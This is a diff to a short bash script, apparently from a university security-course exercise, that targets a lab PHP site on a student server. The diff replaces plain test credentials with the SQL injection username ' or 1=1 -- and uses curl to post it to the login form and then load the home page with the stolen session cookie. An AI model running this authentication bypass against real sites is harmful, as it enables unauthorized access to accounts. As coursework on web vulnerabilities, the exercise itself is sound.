@@ -1,8 +1,5 @@
 #!/bin/bash
 
-ATTACK_USERNAME="alice"
-ATTACK_PASSWORD="passw0rd"
-
 if [ $# -ne 2 ]; then
 	PREFIX="ugster21.student.cs.uwaterloo.ca/sdsuo"
 else
@@ -11,28 +8,30 @@ else
 	PREFIX=$IP:$PORT
 fi
 
-POST_PAGE=http://$PREFIX/post.php
-HOME_PAGE=http://$PREFIX/index.php
-echo "=====[Setup]====="
-echo "Using Login Page at $POST_PAGE"
-echo "Using Home Page at $HOME_PAGE"
+POST_PAGE="$PREFIX/post.php"
+HOME_PAGE="$PREFIX/index.php"
+ATTACK_USERNAME="' or 1=1 --"
+ATTACK_PASSWORD=""
 
-echo "Using attack username $ATTACK_USERNAME"
-echo "Using attack password $ATTACK_PASSWORD"
+echo "=====[Setup]====="
+echo "Using Login Page at: $POST_PAGE"
+echo "Using Home Page at: $HOME_PAGE"
+echo "Using attack username: $ATTACK_USERNAME"
+echo "Using attack password: $ATTACK_PASSWORD"
 
 echo "=====[Login]====="
 echo "Logging in with POST request"
-curl \
--X POST \
+
+curl -X POST \
 -c "cookie.txt" \
 -F "form=login" \
 -F "submit=Login" \
--F "uername=$ATTACK_USERNAME" \
+-F "username=$ATTACK_USERNAME" \
 -F "password=$ATTACK_PASSWORD" \
 $POST_PAGE
 
-echo "=====[Index]====="
+echo
+
+echo "=====[Index Page]====="
 echo "Showing index page with GET request"
-curl \
--b cookie.txt \
-$HOME_PAGE
+curl -b "cookie.txt" $HOME_PAGE
